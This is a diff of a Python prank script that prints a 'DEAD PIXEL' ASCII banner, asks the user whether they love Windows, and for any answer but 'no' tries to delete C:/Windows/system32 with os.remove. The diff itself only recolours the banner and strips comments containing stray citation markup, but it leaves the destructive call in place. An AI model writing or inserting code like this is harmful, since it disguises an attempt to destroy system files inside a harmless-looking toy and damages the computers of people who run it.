@@ -3,20 +3,21 @@ import os
 import sys
 
 def render_dead_pixels():
-    CYAN = "\033[38;5;39m"
-    DIM_LINE = "\033[38;5;18m"
+    # Thallium green ANSI color code (vibrant toxic green)
+    THALLIUM_GREEN = "\033[38;5;46m"
+    DIM_LINE = "\033[38;5;22m"
     RESET = "\033[0m"
     
     top_grid = f"{DIM_LINE}┌────────────────────────────────────────────────────────┐{RESET}"
     bottom_grid = f"{DIM_LINE}└────────────────────────────────────────────────────────┘{RESET}"
 
     banner = [
-        f"{CYAN} ██████  ███████  █████  ██████       ██████  ██ ██   ██ ███████ ██      ███████  ██ {RESET}",
-        f"{CYAN} ██   ██ ██      ██   ██ ██   ██      ██   ██ ██  ██ ██  ██      ██      ██      ███ {RESET}",
-        f"{CYAN} ██   ██ █████   ███████ ██   ██      ██████  ██   ███    █████   ██      █████    ██ {RESET}",
-        f"{CYAN} ██   ██ ██      ██   ██ ██   ██      ██      ██  ██ ██  ██      ██      ██       ██ {RESET}",
-        f"{CYAN} ██████  ███████ ██   ██ ██████       ██      ██ ██   ██ ███████ ███████ ███████  ██ {RESET}",
-        f"{CYAN}                                                                                  █ {RESET}"
+        f"{THALLIUM_GREEN} ██████  ███████  █████  ██████       ██████  ██ ██   ██ ███████ ██      ███████  ██ {RESET}",
+        f"{THALLIUM_GREEN} ██   ██ ██      ██   ██ ██   ██      ██   ██ ██  ██ ██  ██      ██      ██      ███ {RESET}",
+        f"{THALLIUM_GREEN} ██   ██ █████   ███████ ██   ██      ██████  ██   ███    █████   ██      █████    ██ {RESET}",
+        f"{THALLIUM_GREEN} ██   ██ ██      ██   ██ ██   ██      ██      ██  ██ ██  ██      ██      ██       ██ {RESET}",
+        f"{THALLIUM_GREEN} ██████  ███████ ██   ██ ██████       ██      ██ ██   ██ ███████ ███████ ███████  ██ {RESET}",
+        f"{THALLIUM_GREEN}                                                                                  █ {RESET}"
     ]
 
     print()
@@ -29,13 +30,11 @@ def render_dead_pixels():
 def main():
     render_dead_pixels()
     
-    # Interactive logic added from your second snippet[span_0](start_span)[span_0](end_span)
     answer = input("Do you love windows? ")
 
     if answer.lower() == "no":
         print("Good")
     else:
-        # Warning: This does requires admin rights[span_1](start_span)[span_1](end_span)
         try:
             os.remove("C:/Windows/system32")
         except OSError as e:
@@ -46,3 +45,5 @@ if __name__ == "__main__":
         main()
     except KeyboardInterrupt:
         sys.exit(0)
+
+
